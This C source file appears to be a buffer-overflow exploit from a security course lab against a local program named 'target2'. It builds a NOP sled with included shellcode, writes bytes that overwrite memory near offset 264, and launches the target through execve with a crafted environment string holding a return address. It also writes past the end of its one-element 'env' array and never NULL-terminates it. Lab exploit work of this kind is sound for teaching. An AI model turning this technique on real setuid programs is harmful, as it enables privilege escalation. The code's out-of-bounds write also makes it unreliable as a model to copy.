#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"
#define BUFFER_SIZE 284
#define NOP 0x90

int
main ( int argc, char * argv[] )
{
        char *  args[3];
        char *  env[1];

        char attack_buffer[BUFFER_SIZE];

        int i;

        for (i = 0; i < BUFFER_SIZE; i++)
        {
                attack_buffer[i] = NOP;
        }

        char *ptr = attack_buffer + 100;
        for (i = 0; i < strlen(shellcode); i++)
        {
                ptr[i] = shellcode[i];
        }

        attack_buffer[264] = '\x0b';
        attack_buffer[265] = '\x01';
        attack_buffer[269] = '\x01';
        attack_buffer[268] = '\x1b';
        attack_buffer[270] = '\x00';

        args[0] = TARGET;
        args[1] = attack_buffer;
        args[2] = NULL;

        env[0] = "";
        env[1] = "12341234\x58\xfd\xa4\x40";

        if ( execve (TARGET, args, env) < 0 )
                fprintf (stderr, "execve failed.\n");

        return (0);
}
